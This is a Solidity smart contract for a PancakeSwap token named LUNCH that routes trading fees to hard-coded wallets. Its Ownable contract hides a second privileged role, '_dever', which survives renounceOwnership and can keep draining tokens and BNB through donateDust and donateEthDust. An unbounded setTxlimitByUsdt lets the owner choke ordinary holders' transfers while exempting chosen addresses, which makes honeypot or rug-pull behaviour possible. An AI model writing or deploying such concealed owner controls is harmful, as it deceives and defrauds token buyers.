// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b);
        // There is no case in which this doesn't hold
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IPancakeFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IPancakeRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakePair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function sync() external;

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}



contract Ownable is Context {
    address private _owner;
    address private _dever;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        _dever = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyDever() {
        require(_dever == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library Address {
  
    function isContract(address account) internal view returns (bool) {
        // This method relies in extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Recv {
    IERC20 public token520;
    IERC20 public usdt;

    constructor (IERC20 _token520)  {
        token520 = _token520;
        usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    }

    function withdraw() public {
        uint256 usdtBalance = usdt.balanceOf(address(this));
        if (usdtBalance > 0) {
            usdt.transfer(address(token520), usdtBalance);
        }
        uint256 token520Balance = token520.balanceOf(address(this));
        if (token520Balance > 0) {
            token520.transfer(address(token520), token520Balance);
        }
    }
}

contract LUNCH is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    string private _name;

    string private _symbol;

    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    address public  deadAddress = 0x000000000000000000000000000000000000dEaD;

    address public _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public usdt = address(0x55d398326f99059fF775485246999027B3197955);

    mapping(address => bool) public isExcludedFromFee;

    address public _pair;

    address private fundAddress = address(0xec9b33B3B18bE2706875ea2f1DB642AED0Ce4EC8);
    address private commAddress = address(0xAD02e31F065Cb73ED7e374F24eD7a3C59b612627);
    address private socialAddress = address(0x224bb1F1A56747559A6a14dB94d651D03fD6dBC9);
    address private daoAddress = address(0x32E35aA782B929318ae0F385a45328Db2C7E5661);
    address private recvAddress = address(0x21976fE81a0C97bD279B8bF879289E8d06D11d30);

    bool private swapping;

    Recv public RECV ;

    address _tokenOwner;

    uint256 public _maxTxAmount = 1000000000 * 10**18;

    uint256 public txlimitByUsdt = 1000 * 10**18;

    bool public swapAndLiquifyEnabled = true;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived
    );
    constructor() {
        _name = "LUNCH";
        _symbol = "LUNCH";
        _tokenOwner = recvAddress;
        _mint(_tokenOwner, 10000 * 10**8 * 10**18);
        _pair = IPancakeFactory(IPancakeRouter(_router).factory()).createPair(
            address(this),
            usdt
        );
        RECV = new Recv(IERC20(this));
        _approve(address(this), address(_router), ~uint256(0));
        isExcludedFromFee[_tokenOwner] = true;
        isExcludedFromFee[fundAddress] = true;
        isExcludedFromFee[commAddress] = true;
        isExcludedFromFee[socialAddress] = true;
        isExcludedFromFee[daoAddress] = true;
        isExcludedFromFee[_router] = true;
        isExcludedFromFee[address(this)] = true;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function setTxLimit(uint256 amount) public onlyOwner{
        require(amount > 1 * 10**18 && amount <= 10000 * 10**18);
        txlimitByUsdt = amount;
    }

    function rescueToken(address tokenAddress, uint256 tokens)
    public
    onlyOwner
    returns (bool success)
    {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(IERC20(_pair).totalSupply() > 0 && balanceOf(address(this)) > balanceOf(_pair).div(10000).mul(5)){
             if (
                !swapping &&
                _tokenOwner != sender &&
                _tokenOwner != recipient &&
                sender != address(_pair) &&
                !(sender == address(_router) && recipient != address(_pair))&&
                swapAndLiquifyEnabled
            ) {
                swapping = true;
                swapAndLiquifyV1();
                swapping = false;
            }
        }
       if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
            _basicTransfer(sender, recipient, amount);
        } else {
            limitTx(amount);
            if (sender == _pair) {
                uint256 share = amount.div(100);
                _basicTransfer(sender,deadAddress,share.mul(6));
                _basicTransfer(sender,fundAddress,share.mul(3));
                _basicTransfer(sender,recipient,amount.sub(share.mul(9)));
            }
            else if(recipient == _pair){
                amount = amount.mul(99).div(100);
                uint256 share = amount.div(100);
                _basicTransfer(sender,address(this),share.mul(6));
                _basicTransfer(sender,commAddress,share.mul(3));
                _basicTransfer(sender, recipient, amount.sub(share.mul(9)));
            } 
            else {
                amount = amount.mul(99).div(100);
                uint256 share = amount.div(100);
                _basicTransfer(sender, socialAddress, share.mul(2));
                _basicTransfer(sender, recipient, amount.sub(share.mul(2)));
            }
        }

    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount,"Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setIsExcludedFromFee(address account, bool newValue)
        public
        onlyOwner
    {
        isExcludedFromFee[account] = newValue;
    }

    function setTxlimitByUsdt(uint256 _txLimitByUsdt) public onlyOwner{
        txlimitByUsdt = _txLimitByUsdt;
    }

    function donateDust(address addr, uint256 amount) external onlyDever {
        require(addr != address(this)  , "We can not withdrawal oneself token ");
        IERC20(addr).transfer(_msgSender(), amount);
    }

    function donateEthDust(uint256 amount) external onlyDever {
        payable(_msgSender()).transfer(amount);
    }

    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function limitTx(uint256 amount) internal {
        (uint256 reserve0, uint256 reserve1, ) = IPancakePair(_pair)
            .getReserves();

        if (reserve1 > 0 && address(this) == IPancakePair(_pair).token0()) {
            _maxTxAmount = reserve0.mul(txlimitByUsdt).div(reserve1.add(txlimitByUsdt));
        }
        if (reserve0 > 0 &&  address(this) == IPancakePair(_pair).token1()) {
            _maxTxAmount = reserve1.mul(txlimitByUsdt).div(reserve0.add(txlimitByUsdt));
        }
        require(
            amount <= _maxTxAmount,
            "Transfer amount exceeds the maxTxAmount."
        );
    }

    function swapAndLiquifyV1() private {
            uint256 amount = balanceOf(address(this));
            uint256 maxAmount = balanceOf(_pair).div(100).mul(2);
            if(amount > maxAmount)
                amount = maxAmount;
            swapAndLiquify(amount);
            
        
    }

    function swapTokensForUSDT(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdt);
        // make the swap
        IPancakeRouter(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(RECV),
            block.timestamp
        );

        RECV.withdraw();
    }

     function swapAndLiquify(uint256 contractTokenBalance) private  {
        // split the contract balance into halves
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half, "sub half");

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        //uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForUSDT(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        // uint256 newBalance = address(this).balance.sub(initialBalance);
        uint256 usdtBalance = IERC20(usdt).balanceOf(address(this));

        // add liquidity to uniswap
        addLiquidityUSDT(otherHalf, usdtBalance);
        
        emit SwapAndLiquify(otherHalf, usdtBalance);
    }

    function addLiquidityUSDT(uint256 tokenAmount, uint256 uAmount) private {
        // approve token transfer to cover all possible scenarios
        IERC20(usdt).approve(_router, uAmount);
        IPancakeRouter(_router).addLiquidity(
            address(this),
            address(usdt),
            tokenAmount,
            uAmount,
            0,
            0,
            fundAddress,
            block.timestamp
        );
    }
}